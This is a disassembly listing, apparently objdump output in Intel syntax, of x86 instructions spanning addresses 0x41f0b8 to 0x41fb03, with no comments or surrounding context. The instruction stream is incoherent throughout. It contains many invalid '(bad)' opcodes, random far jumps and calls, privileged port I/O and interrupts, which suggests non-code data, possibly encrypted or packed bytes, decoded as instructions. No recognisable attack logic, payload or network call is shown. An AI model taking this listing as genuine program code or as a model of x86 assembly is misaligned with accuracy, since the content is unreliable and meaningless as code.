  41f0b8:	loope  0x41f0df
  41f0ba:	xchg   ebp,eax
  41f0bb:	cmp    DWORD PTR ds:[esi-0x5f6cbbcb],0x6ae21baa
  41f0c6:	dec    eax
  41f0c7:	mov    ecx,0xd8a43fc9
  41f0cc:	push   eax
  41f0cd:	cs dec ebx
  41f0cf:	pop    ds
  41f0d0:	xlat   BYTE PTR ds:[ebx]
  41f0d1:	ficomp DWORD PTR ds:0x12233f2f
  41f0d7:	imul   edi,DWORD PTR [ecx+edi*4-0xf],0xe356c137
  41f0df:	pop    ds
  41f0e0:	mov    edi,0x34b719fe
  41f0e5:	sub    BYTE PTR [ecx],bl
  41f0e7:	std    
  41f0e8:	xchg   ebx,eax
  41f0e9:	jmp    0x93c8:0x54565c7
  41f0f0:	fbstp  TBYTE PTR [ebp+0x20]
  41f0f3:	lods   al,BYTE PTR ds:[esi]
  41f0f4:	adc    dh,BYTE PTR [ecx-0x74d45941]
  41f0fa:	call   0x4baf8be2
  41f0ff:	loope  0x41f0d8
  41f101:	dec    esi
  41f102:	in     al,0x98
  41f104:	adc    al,0x47
  41f106:	je     0x41f0df
  41f108:	ds mov eax,0x82a74805
  41f10e:	fs push edx
  41f110:	xor    eax,0x0
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x136c3e44
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0xb4000001
  41f18d:	xor    eax,0x97cd2c61
  41f192:	iret   
  41f193:	fmul   DWORD PTR [ecx-0x6da60107]
  41f199:	adc    DWORD PTR [ecx-0x26e3fa80],esi
  41f19f:	sbb    esp,edi
  41f1a1:	push   esp
  41f1a2:	mov    esp,0x32e90173
  41f1a7:	sub    esp,DWORD PTR [edx]
  41f1a9:	inc    esi
  41f1aa:	cdq    
  41f1ab:	ins    BYTE PTR es:[edi],dx
  41f1ac:	sub    esp,DWORD PTR [ebx+0x99da0f9]
  41f1b2:	push   es
  41f1b3:	mov    BYTE PTR [edx-0x12af6b8b],cl
  41f1b9:	enter  0xf92c,0xec
  41f1bd:	jb     0x41f147
  41f1bf:	inc    ebp
  41f1c0:	(bad)  
  41f1c2:	inc    ebx
  41f1c3:	and    esp,DWORD PTR [ebx]
  41f1c5:	ret    0xcc7a
  41f1c8:	jecxz  0x41f1a6
  41f1ca:	ss imul ecx,edi,0x71a85264
  41f1d1:	scas   al,BYTE PTR es:[edi]
  41f1d2:	xchg   DWORD PTR [edx-0x49],ebx
  41f1d5:	push   cs
  41f1d6:	jno    0x41f161
  41f1d8:	cli    
  41f1d9:	into   
  41f1da:	xor    eax,0xa12260ea
  41f1df:	shl    BYTE PTR es:[edi+0x1128acec],0x51
  41f1e7:	pop    ebx
  41f1e8:	arpl   WORD PTR [esi],bp
  41f1ea:	es push edx
  41f1ec:	test   BYTE PTR [eax+0x3e],dl
  41f1ef:	or     bh,bl
  41f1f1:	into   
  41f1f2:	push   esp
  41f1f3:	sub    al,0x70
  41f1f5:	jl     0x41f1a1
  41f1f7:	xsha256 (bad)
  41f1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1f9:	xchg   edi,eax
  41f1fa:	(bad)  [ebx]
  41f1fc:	cdq    
  41f1fd:	ror    ah,1
  41f1ff:	sbb    al,ah
  41f201:	mov    ch,0x9c
  41f203:	cld    
  41f204:	pop    ebx
  41f205:	(bad)  
  41f206:	pop    ss
  41f207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f208:	add    BYTE PTR [edi],0x1b
  41f20b:	inc    eax
  41f20c:	adc    DWORD PTR [ebx],ecx
  41f20e:	out    dx,al
  41f20f:	stc    
  41f210:	lods   eax,DWORD PTR ds:[esi]
  41f211:	xor    DWORD PTR [ecx-0x53],edi
  41f214:	push   0x9358805a
  41f219:	jg     0x41f214
  41f21b:	je     0x41f1a7
  41f21d:	cs enter 0x9357,0x25
  41f222:	ret    0xcdd
  41f225:	add    eax,0x4ecd91bd
  41f22a:	jns    0x41f25b
  41f22c:	jmp    0x41f1b5
  41f22e:	cmp    ebx,ebx
  41f230:	push   esi
  41f231:	sub    al,0x8
  41f233:	sub    edi,DWORD PTR [ecx-0x54]
  41f236:	lea    ebx,[ebx-0x31]
  41f239:	xchg   ebp,eax
  41f23a:	xchg   edi,eax
  41f23b:	dec    esi
  41f23c:	(bad)  
  41f23d:	arpl   WORD PTR [eax],sp
  41f23f:	mov    ds:0xfa11a240,eax
  41f244:	retf   0x5c90
  41f247:	push   ecx
  41f248:	retf   0x6cee
  41f24b:	jbe    0x41f280
  41f24d:	fxch   st(4)
  41f24f:	and    DWORD PTR [eax+eiz*8],esp
  41f252:	mov    dl,ch
  41f254:	stos   DWORD PTR es:[edi],eax
  41f255:	frstor [edx-0x6a]
  41f258:	call   0x68034af3
  41f25d:	fs inc ebx
  41f25f:	mov    eax,ds:0x8f36d7a
  41f264:	jne    0x41f207
  41f266:	xor    BYTE PTR [edx+0x7],cl
  41f269:	loopne 0x41f2a5
  41f26b:	fstp   QWORD PTR [ebp-0x61]
  41f26e:	jmp    0xb97e:0xc90967f3
  41f275:	add    eax,0x20e32cd5
  41f27a:	ficomp WORD PTR [edi-0x604fbf22]
  41f280:	test   BYTE PTR [ecx],dl
  41f282:	gs jae 0x41f222
  41f285:	jmp    0x41f2ae
  41f287:	inc    ebx
  41f288:	pop    esp
  41f289:	sub    BYTE PTR [edi-0x3dda9e7c],al
  41f28f:	fldcw  WORD PTR [ebp+0x0]
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f360
  41f301:	jne    0x41f2e4
  41f303:	in     eax,dx
  41f304:	xor    al,0x4c
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0x4d000001
  41f30d:	iret   
  41f30e:	js     0x41f31b
  41f310:	mov    esp,0xcbe73d31
  41f315:	std    
  41f316:	das    
  41f317:	mov    ds:0xbd6fbf0f,al
  41f31c:	mov    edi,0x5a15f5d3
  41f321:	add    al,0x5d
  41f323:	das    
  41f324:	or     eax,DWORD PTR [edi-0x26]
  41f327:	xlat   BYTE PTR ds:[ebx]
  41f328:	push   ds
  41f329:	mov    dl,0x58
  41f32b:	cld    
  41f32c:	jp     0x41f38b
  41f32e:	fld    QWORD PTR [eax]
  41f330:	inc    eax
  41f331:	mov    esp,0xd9a9012e
  41f336:	add    DWORD PTR [esi-0x1e],esp
  41f339:	daa    
  41f33a:	mov    al,ds:0xc0ff23b8
  41f33f:	jg     0x41f364
  41f341:	xlat   BYTE PTR ds:[ebx]
  41f342:	add    BYTE PTR [ebx+0x37],0xa1
  41f346:	cld    
  41f347:	mov    WORD PTR [esi+0x49f2d97],ss
  41f34d:	mov    al,ds:0xd4ed5cdd
  41f352:	pop    ecx
  41f353:	dec    eax
  41f354:	adc    eax,0xbf903ee5
  41f359:	adc    dl,cl
  41f35b:	jmp    0x41f307
  41f35d:	and    esp,esi
  41f35f:	das    
  41f360:	and    eax,esp
  41f362:	pop    ss
  41f363:	and    esi,eax
  41f365:	js     0x41f37e
  41f367:	out    dx,al
  41f368:	ins    DWORD PTR es:[edi],dx
  41f369:	(bad)  
  41f36a:	adc    esp,edx
  41f36c:	push   ss
  41f36d:	retf   0x6ad5
  41f370:	addr16 dec ecx
  41f372:	fimul  DWORD PTR [edi+0x49716cf4]
  41f378:	ins    BYTE PTR es:[edi],dx
  41f379:	int    0xc0
  41f37b:	out    dx,eax
  41f37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f37d:	or     DWORD PTR [ecx-0x3ebec0d0],esp
  41f383:	and    DWORD PTR [eax-0x6a64d263],ecx
  41f389:	xchg   esi,eax
  41f38a:	push   0xffffffa7
  41f38c:	into   
  41f38d:	nop
  41f38e:	xchg   ebx,eax
  41f38f:	jg     0x41f3d7
  41f391:	shl    BYTE PTR [edx+0x70],0x4b
  41f395:	push   edi
  41f396:	and    ch,0x64
  41f399:	and    ebx,DWORD PTR [esi+eiz*8]
  41f39c:	cmp    al,BYTE PTR [eax]
  41f39e:	xor    DWORD PTR [edx-0x5a282671],edi
  41f3a4:	dec    edi
  41f3a5:	cmp    edi,DWORD PTR [ebp-0x77]
  41f3a8:	jp     0x41f3b0
  41f3aa:	les    eax,FWORD PTR [ebx+0x16cf3449]
  41f3b0:	and    DWORD PTR [ebx-0x77178d14],eax
  41f3b6:	push   0xe8ff2812
  41f3bb:	int    0x65
  41f3bd:	inc    edi
  41f3be:	xchg   cl,cl
  41f3c0:	sahf   
  41f3c1:	in     al,0x10
  41f3c3:	test   eax,0x55e6f55d
  41f3c8:	dec    esp
  41f3c9:	outs   dx,DWORD PTR ds:[esi]
  41f3ca:	or     ch,BYTE PTR [eax-0x1b]
  41f3cd:	cdq    
  41f3ce:	(bad)
  41f3d2:	je     0x41f3a9
  41f3d4:	push   ebx
  41f3d5:	in     al,dx
  41f3d6:	into   
  41f3d7:	addr16 mov al,fs:0x25b9
  41f3dc:	data16 jno 0x41f435
  41f3df:	ror    BYTE PTR [edi],0x64
  41f3e2:	mov    edx,0xb0e93e5e
  41f3e7:	sbb    al,0xcf
  41f3e9:	mov    esi,0x4713eda8
  41f3ee:	mov    ecx,0xccd2db82
  41f3f3:	mov    ebx,0x4313ed27
  41f3f8:	cli    
  41f3f9:	imul   ecx,edi,0x96cb883a
  41f3ff:	mov    cs,ebp
  41f401:	add    eax,0xadb4a90c
  41f406:	std    
  41f407:	addr16 sbb eax,0xa6795f37
  41f40d:	cs push ecx
  41f40f:	imul   edx,DWORD PTR [ecx+0x0],0x0
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xd8
  41f481:	test   DWORD PTR [eax-0x1e],ecx
  41f484:	cmp    DWORD PTR [ebp+0x1],ecx
  41f487:	add    BYTE PTR ds:0x8000001,al
  41f48d:	mov    ah,0xf5
  41f48f:	pop    edi
  41f490:	jmp    0x74bd:0x8967b59f
  41f497:	iret   
  41f498:	jl     0x41f479
  41f49a:	push   cs
  41f49b:	nop
  41f49c:	popf   
  41f49d:	in     al,dx
  41f49e:	imul   ebp,DWORD PTR [esi],0x3a
  41f4a1:	lock sbb DWORD PTR [ecx],esi
  41f4a4:	adc    bh,BYTE PTR [ebx+0xba960f9]
  41f4aa:	add    edi,0xfffffff8
  41f4ad:	inc    esp
  41f4ae:	add    al,0xe4
  41f4b0:	or     eax,0x29592be1
  41f4b5:	pop    ecx
  41f4b6:	adc    BYTE PTR fs:[edi-0x38c0c5ea],0xf
  41f4be:	inc    edi
  41f4bf:	add    al,0xfb
  41f4c1:	push   cs
  41f4c2:	(bad)  
  41f4c3:	mov    esp,0xf2838de
  41f4c8:	adc    esp,DWORD PTR [esi-0x6d]
  41f4cb:	push   esi
  41f4cc:	add    eax,0x39abd84b
  41f4d1:	inc    edx
  41f4d2:	sbb    edx,DWORD PTR [ecx-0x43d9b1cb]
  41f4d8:	xchg   edx,eax
  41f4d9:	dec    ecx
  41f4da:	(bad)  
  41f4db:	fild   WORD PTR [ecx+ecx*8]
  41f4de:	push   ebx
  41f4df:	pushf  
  41f4e0:	xchg   DWORD PTR [ebx-0x7],ebx
  41f4e3:	lods   al,BYTE PTR ds:[esi]
  41f4e4:	lea    sp,[edx-0x39]
  41f4e8:	add    edi,DWORD PTR [esi]
  41f4ea:	mov    ch,0x69
  41f4ec:	inc    ecx
  41f4ed:	addr16 pop esi
  41f4ef:	dec    ebp
  41f4f0:	jbe    0x41f4c7
  41f4f2:	sar    edi,1
  41f4f4:	scas   al,BYTE PTR es:[edi]
  41f4f5:	sub    al,0x11
  41f4f7:	jb     0x41f490
  41f4f9:	test   esi,ecx
  41f4fb:	pop    edi
  41f4fc:	xor    DWORD PTR [esi-0x1ff5b62],ecx
  41f502:	inc    ebx
  41f503:	dec    esp
  41f504:	pusha  
  41f505:	mov    WORD PTR [ecx],gs
  41f507:	mov    cl,al
  41f509:	iret   
  41f50a:	in     al,0x27
  41f50c:	or     al,0x47
  41f50e:	nop
  41f50f:	les    edi,FWORD PTR [edi+0x21ffed50]
  41f515:	add    bh,dl
  41f517:	push   0xffffff94
  41f519:	retf   0xea1b
  41f51c:	xchg   edi,eax
  41f51d:	nop
  41f51e:	and    BYTE PTR [ecx+0x6e],0xa5
  41f522:	and    DWORD PTR [eax+0xfb60561],esp
  41f528:	lods   eax,DWORD PTR ds:[esi]
  41f529:	sar    DWORD PTR [esi],1
  41f52b:	jmp    0x41f544
  41f52d:	mov    ?,eax
  41f52f:	fsubr  DWORD PTR [eax+0xd]
  41f532:	neg    BYTE PTR es:[ebp+ebx*1-0x5c]
  41f537:	cs sub esi,esi
  41f53a:	hlt    
  41f53b:	cmp    al,0x1a
  41f53d:	aad    0x77
  41f53f:	inc    ebx
  41f540:	and    ecx,ecx
  41f542:	data16 xor al,0xda
  41f545:	mov    esi,0xa8e7a0db
  41f54a:	push   edx
  41f54b:	xor    eax,0x12b92f5d
  41f550:	(bad)  
  41f551:	push   esi
  41f552:	test   eax,0x9967777a
  41f557:	mov    cl,0xf6
  41f559:	mov    dh,0x13
  41f55b:	inc    esp
  41f55c:	and    DWORD PTR [esp+ecx*4+0x9],0xa56cbd6c
  41f564:	cmp    BYTE PTR ds:0xa9946a0c,cl
  41f56a:	call   0xaea83e8a
  41f56f:	dec    ecx
  41f570:	mov    dh,0xf
  41f572:	push   edi
  41f573:	(bad)  [ecx-0x3c]
  41f576:	ret    0xc622
  41f579:	(bad)  
  41f57a:	xchg   esp,eax
  41f57b:	popf   
  41f57c:	adc    al,0x34
  41f57e:	sbb    eax,0x40d2ccdb
  41f583:	popa   
  41f584:	add    esi,0xebd84c6a
  41f58a:	dec    eax
  41f58b:	outs   dx,BYTE PTR ds:[esi]
  41f58c:	push   es
  41f58d:	jmp    DWORD PTR [ebx+0x2aaa]
	...
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x495f:0x344fd422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x4a000001
  41f60d:	in     eax,0x8e
  41f60f:	push   edx
  41f610:	mov    edi,0x6f76a6bb
  41f615:	jnp    0x41f674
  41f617:	popf   
  41f618:	mov    esp,0x3e546fe9
  41f61d:	sti    
  41f61e:	xor    al,0xa9
  41f620:	dec    esp
  41f621:	sti    
  41f622:	pop    ebp
  41f623:	xchg   ecx,eax
  41f624:	ins    BYTE PTR es:[edi],dx
  41f625:	in     eax,dx
  41f626:	retf   0x4c45
  41f629:	mov    ds,WORD PTR [esi]
  41f62b:	fdiv   DWORD PTR [edi]
  41f62d:	cmp    al,cl
  41f62f:	xor    eax,0x6f1cdfad
  41f634:	xlat   BYTE PTR ds:[ebx]
  41f635:	or     ch,BYTE PTR [ecx+0x21ecc37f]
  41f63b:	or     esp,DWORD PTR [edx-0x613e3286]
  41f641:	pop    ds
  41f642:	push   0xe882f995
  41f647:	mov    ds:0x117cab6e,al
  41f64c:	imul   eax,DWORD PTR ds:0x19d1979d,0x4d
  41f653:	cmp    eax,0x31b1083d
  41f658:	shl    DWORD PTR [edi],1
  41f65a:	dec    ebp
  41f65b:	stos   DWORD PTR es:[edi],eax
  41f65c:	lods   al,BYTE PTR ds:[esi]
  41f65d:	out    0xa1,al
  41f65f:	movaps XMMWORD PTR [eax],xmm2
  41f662:	jae    0x41f65f
  41f664:	stos   DWORD PTR es:[edi],eax
  41f665:	ret    0xc9dd
  41f668:	daa    
  41f669:	ja     0x41f644
  41f66b:	gs mov cl,bh
  41f66e:	push   edx
  41f66f:	add    dl,BYTE PTR [ebp+0x4aff0b52]
  41f675:	lahf   
  41f676:	push   0x2c4e658a
  41f67b:	nop
  41f67c:	jb     0x41f649
  41f67e:	xor    al,0x5a
  41f680:	bound  esi,QWORD PTR [ebp+esi*1+0x55]
  41f684:	dec    ecx
  41f685:	jno    0x41f6f6
  41f687:	retf   0x99f0
  41f68a:	ret    
  41f68b:	inc    esp
  41f68c:	sbb    bl,BYTE PTR [ebp-0xa]
  41f68f:	inc    ebx
  41f690:	sbb    al,0xa8
  41f692:	push   ebp
  41f693:	inc    edx
  41f694:	sub    ah,BYTE PTR [edx-0x5efda39]
  41f69a:	or     BYTE PTR [edx],dh
  41f69c:	mov    ds:0xd24cb5a6,eax
  41f6a1:	(bad)  
  41f6a2:	loop   0x41f643
  41f6a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6a5:	in     al,dx
  41f6a6:	mov    ch,0x99
  41f6a8:	pop    ss
  41f6a9:	outs   dx,BYTE PTR ds:[esi]
  41f6aa:	jb     0x41f708
  41f6ac:	or     esp,ebp
  41f6ae:	aad    0xbb
  41f6b0:	sub    dh,BYTE PTR [eax-0x47ede803]
  41f6b6:	gs jge 0x41f66c
  41f6b9:	lea    edx,[edi-0x43dc8369]
  41f6bf:	or     ebp,DWORD PTR [ecx]
  41f6c1:	add    BYTE PTR [edi],bh
  41f6c3:	xchg   ecx,eax
  41f6c4:	in     eax,dx
  41f6c5:	jb     0x41f694
  41f6c7:	cmp    BYTE PTR [ebp-0x32],cl
  41f6ca:	std    
  41f6cb:	mov    ecx,0xabd8d802
  41f6d0:	xor    eax,0x94b0612b
  41f6d5:	xchg   ecx,eax
  41f6d6:	mov    ebp,0xeb88ec24
  41f6db:	cli    
  41f6dc:	sbb    eax,edx
  41f6de:	fnstenv [ebx+0x67]
  41f6e1:	or     DWORD PTR [edi],eax
  41f6e3:	add    DWORD PTR [eax*2+0x281661e2],0xffffffd0
  41f6eb:	pop    esi
  41f6ec:	(bad)  
  41f6ed:	retf   
  41f6ee:	int3   
  41f6ef:	jl     0x41f704
  41f6f1:	add    DWORD PTR [esi],esi
  41f6f3:	pushf  
  41f6f4:	xchg   ecx,eax
  41f6f5:	aam    0xd8
  41f6f7:	and    BYTE PTR [edx-0x72],ch
  41f6fa:	outs   dx,BYTE PTR ds:[esi]
  41f6fb:	fcomip st,st(0)
  41f6fd:	mov    cl,0x9
  41f6ff:	cs into 
  41f701:	push   0xaf6ad9e1
  41f706:	test   edx,esp
  41f708:	outs   dx,BYTE PTR ds:[esi]
  41f709:	fild   WORD PTR [edx]
  41f70b:	pushf  
  41f70c:	gs inc eax
  41f70e:	sahf   
  41f70f:	push   eax
  41f710:	mov    eax,DWORD PTR [eax]
	...
  41f772:	add    BYTE PTR [eax],al
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xc109:0x4e6c62d2
  41f783:	inc    ebx
  41f784:	inc    ebx
  41f785:	dec    edi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0x25000001
  41f78d:	mov    eax,0x8b20a900
  41f792:	ins    DWORD PTR es:[edi],dx
  41f793:	mov    eax,0xf141d432
  41f798:	add    BYTE PTR fs:[esi+esi*8-0x29],0xcd
  41f79e:	cwde   
  41f79f:	xor    eax,0xce71595d
  41f7a4:	out    0x86,al
  41f7a6:	outs   dx,DWORD PTR ds:[esi]
  41f7a7:	lds    ebx,FWORD PTR [ebx+0x24]
  41f7aa:	ja     0x41f7c6
  41f7ac:	mov    bl,bh
  41f7ae:	adc    DWORD PTR [ebp+0x3d4587a8],esi
  41f7b4:	jge    0x41f796
  41f7b6:	lahf   
  41f7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7b8:	loopne 0x41f74d
  41f7ba:	out    dx,al
  41f7bb:	add    edx,edi
  41f7bd:	fldcw  WORD PTR [edi]
  41f7bf:	shl    edx,1
  41f7c1:	sub    al,BYTE PTR [esi-0x56]
  41f7c4:	or     ebp,esp
  41f7c6:	sbb    cl,BYTE PTR [ebx-0x2e]
  41f7c9:	in     al,0x3d
  41f7cb:	out    0xc9,al
  41f7cd:	jnp    0x41f834
  41f7cf:	pusha  
  41f7d0:	fsubr  st,st(7)
  41f7d2:	mov    DWORD PTR [ecx+0x1bb15a21],0xca998932
  41f7dc:	add    DWORD PTR [eax],eax
  41f7de:	in     eax,0xfd
  41f7e0:	loopne 0x41f82d
  41f7e2:	cdq    
  41f7e3:	mov    ds:0x8ff9dbe9,eax
  41f7e8:	cmp    ecx,0x9775c5fc
  41f7ee:	adc    eax,0xda0cea5
  41f7f3:	xchg   esp,eax
  41f7f4:	mov    bl,0xb9
  41f7f6:	enter  0xf7b,0xe8
  41f7fa:	jbe    0x41f825
  41f7fc:	in     eax,dx
  41f7fd:	pusha  
  41f7fe:	imul   ebp,DWORD PTR ds:0x68d39c84,0x2beddc67
  41f808:	retf   
  41f809:	call   0x4bcb13a6
  41f80e:	int    0xe1
  41f810:	les    edi,FWORD PTR [ebx-0x30]
  41f813:	pusha  
  41f814:	fcos   
  41f816:	ss adc esi,ebx
  41f819:	lods   al,BYTE PTR ds:[esi]
  41f81a:	xlat   BYTE PTR cs:[bx]
  41f81d:	cmp    cl,bl
  41f81f:	bound  edx,QWORD PTR [ecx+0x338f2f66]
  41f825:	in     eax,0xf9
  41f827:	repz out 0xee,al
  41f82a:	call   0xac57:0xd4c817c7
  41f831:	test   al,0x4c
  41f833:	xchg   edx,eax
  41f834:	push   es
  41f835:	add    al,0x5f
  41f837:	mov    ebx,0x3159c218
  41f83c:	sub    DWORD PTR [edi+0x6e7ee112],0xffffffb7
  41f843:	call   0x2b9a1a57
  41f848:	jnp    0x41f7d4
  41f84a:	adc    DWORD PTR [ebx+0xf30104e],ecx
  41f850:	adc    edx,DWORD PTR [eax]
  41f852:	aaa    
  41f853:	dec    ch
  41f855:	call   0x6cc7:0x93cf8a5c
  41f85c:	hlt    
  41f85d:	xchg   DWORD PTR [edx+0x464a6b82],esp
  41f863:	or     bh,BYTE PTR [esi+0x623390cc]
  41f869:	dec    esp
  41f86a:	(bad)  
  41f86b:	out    dx,al
  41f86c:	jbe    0x41f854
  41f86e:	mov    dl,0x22
  41f870:	out    0x35,al
  41f872:	push   eax
  41f873:	or     DWORD PTR [edi+ecx*8+0x4a],0x7a
  41f878:	mov    ecx,0xc1100011
  41f87d:	ja     0x41f833
  41f87f:	data16 fdiv DWORD PTR cs:[ebx+0x5]
  41f884:	adc    DWORD PTR [ebx+0x78],ebp
  41f887:	nop
  41f888:	push   esi
  41f889:	fdivr  st(6),st
  41f88b:	push   0xb6b99926
  41f890:	mov    DWORD PTR [eax],eax
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	and    eax,0x486cf689
  41f905:	push   eax
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x46000001
  41f90d:	imul   ebx,DWORD PTR [esi],0x57
  41f910:	(bad)  
  41f911:	dec    esp
  41f913:	pop    ecx
  41f914:	ss mov dh,0xa0
  41f917:	lahf   
  41f918:	pop    ebp
  41f919:	adc    esp,DWORD PTR [ebp+0x75653e10]
  41f91f:	push   ds
  41f920:	jae    0x41f974
  41f922:	xchg   ebx,eax
  41f923:	push   ecx
  41f924:	sbb    edi,DWORD PTR [eax]
  41f926:	les    edi,FWORD PTR [ebp+0x479a0633]
  41f92c:	or     bl,BYTE PTR [ebx+ebx*2-0x28]
  41f930:	imul   ebx,DWORD PTR [esi+0xd695559],0xf02dc359
  41f93a:	aas    
  41f93b:	call   0xdfb2:0x2dedf95e
  41f942:	cmp    dl,BYTE PTR [ecx-0x65]
  41f945:	xchg   edi,eax
  41f946:	fnsave ds:0xdc71835f
  41f94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f94d:	bound  ecx,QWORD PTR [edi]
  41f94f:	push   eax
  41f950:	pop    ecx
  41f951:	ret    
  41f952:	adc    ebp,DWORD PTR [ebx]
  41f954:	int3   
  41f955:	mov    cl,0x5b
  41f957:	xchg   ecx,eax
  41f958:	jo     0x41f9cd
  41f95a:	scas   al,BYTE PTR es:[edi]
  41f95b:	aaa    
  41f95c:	push   ecx
  41f95d:	mov    dh,0xd2
  41f95f:	sub    DWORD PTR [eax+0x45c230e8],0x6731488e
  41f969:	out    0x74,eax
  41f96b:	outs   dx,DWORD PTR ds:[esi]
  41f96c:	mov    ah,0xb8
  41f96e:	or     ah,bl
  41f970:	or     eax,0xb2f42e6b
  41f975:	jns    0x41f9e1
  41f977:	mov    bl,0x48
  41f979:	inc    eax
  41f97a:	sub    ax,WORD PTR [edi]
  41f97d:	inc    ebp
  41f97e:	mov    eax,ds:0x6889360b
  41f983:	fidivr DWORD PTR [edi-0x59623d1]
  41f989:	int    0xb1
  41f98b:	mov    dl,0xf3
  41f98d:	sbb    al,0x3e
  41f98f:	shr    BYTE PTR ds:0x88a0700c,1
  41f995:	pop    edi
  41f996:	jb     0x41f957
  41f998:	jle    0x41f9d8
  41f99a:	push   ss
  41f99b:	test   DWORD PTR [edi],0xc01b8c82
  41f9a1:	xchg   ebx,eax
  41f9a2:	mov    al,ds:0x510c0699
  41f9a7:	push   esi
  41f9a8:	dec    ebx
  41f9a9:	dec    edx
  41f9aa:	xor    ecx,DWORD PTR [eax-0x1a]
  41f9ad:	and    al,0xfc
  41f9af:	mov    ebx,DWORD PTR [edx+ebp*8]
  41f9b2:	ins    BYTE PTR es:[edi],dx
  41f9b3:	adc    DWORD PTR [edi-0x4faed46c],ebp
  41f9b9:	out    0xbb,eax
  41f9bb:	jl     0x41fa39
  41f9bd:	add    eax,0xd01a886e
  41f9c2:	icebp  
  41f9c3:	fnstcw WORD PTR [eax]
  41f9c5:	(bad)  
  41f9c6:	or     al,0x28
  41f9c8:	out    dx,al
  41f9c9:	inc    edx
  41f9ca:	scas   al,BYTE PTR es:[edi]
  41f9cb:	fild   DWORD PTR [ecx]
  41f9cd:	cmp    eax,0x1ca6b6fa
  41f9d2:	das    
  41f9d3:	push   ecx
  41f9d4:	mov    esp,0xf1ec67c
  41f9d9:	or     edi,ecx
  41f9db:	std    
  41f9dc:	and    eax,0x7d7622cb
  41f9e1:	mov    edi,0xaa96d764
  41f9e6:	fsub   DWORD PTR [esi+0x1c690369]
  41f9ec:	fsqrt  
  41f9ee:	std    
  41f9ef:	mov    bh,0x6f
  41f9f1:	(bad)  
  41f9f2:	push   ebp
  41f9f3:	addr16 push cs
  41f9f5:	mov    esi,0xffea9003
  41f9fa:	jno    0x41fa73
  41f9fc:	mov    ebp,ds
  41f9fe:	mov    ds:0x7aaffaa7,eax
  41fa03:	popf   
  41fa04:	inc    esp
  41fa05:	push   eax
  41fa06:	(bad)  
  41fa07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa08:	inc    ebx
  41fa09:	sti    
  41fa0a:	xchg   ebx,eax
  41fa0b:	or     al,BYTE PTR [ebx+eax*8+0x41fcb0]
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x8fbe956
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x92000001
  41fa8d:	outs   dx,DWORD PTR ds:[esi]
  41fa8e:	shrd   edx,ecx,cl
  41fa91:	mov    al,ds:0xaca00338
  41fa96:	or     dh,dh
  41fa98:	sbb    eax,0xf9e9c29b
  41fa9d:	jae    0x41fa2c
  41fa9f:	pushf  
  41faa0:	fdivr  st,st(3)
  41faa2:	inc    edi
  41faa3:	js     0x41fb06
  41faa5:	add    BYTE PTR [eax-0x5a12e6fb],al
  41faab:	push   edx
  41faac:	ror    BYTE PTR [ebp-0x29],1
  41faaf:	retf   0x739
  41fab2:	ins    BYTE PTR es:[edi],dx
  41fab3:	in     al,0x76
  41fab5:	mov    cl,0x45
  41fab7:	adc    edx,ebx
  41fab9:	inc    ebp
  41faba:	mov    al,ds:0x7a4d9536
  41fabf:	adc    al,0xc0
  41fac1:	mov    ebp,ebp
  41fac3:	mov    ah,0x1b
  41fac5:	pop    esi
  41fac6:	enter  0xee20,0x34
  41faca:	popa   
  41facb:	fistp  QWORD PTR [ebx]
  41facd:	jb     0x41fad1
  41facf:	mov    bl,BYTE PTR [ebx]
  41fad1:	pop    edi
  41fad2:	daa    
  41fad3:	iret   
  41fad4:	mov    ss,WORD PTR [ebx+esi*2+0xa0ad911]
  41fadb:	jmp    0xf2721d72
  41fae0:	sbb    ch,dl
  41fae2:	ss out dx,eax
  41fae4:	(bad)  
  41fae6:	or     eax,0x792cf366
  41faeb:	cs push esp
  41faed:	sti    
  41faee:	popf   
  41faef:	sub    al,0x31
  41faf1:	sub    esi,edx
  41faf3:	xchg   BYTE PTR [esi-0x42],al
  41faf6:	pushf  
  41faf7:	in     eax,0xa9
  41faf9:	add    esi,DWORD PTR [edx+0x4f]
  41fafc:	shl    DWORD PTR [edi-0xf],0xa6
  41fb00:	xchg   ebx,eax
  41fb01:	add    esp,edx
  41fb03:	ins    BYTE PTR es:[edi],dx
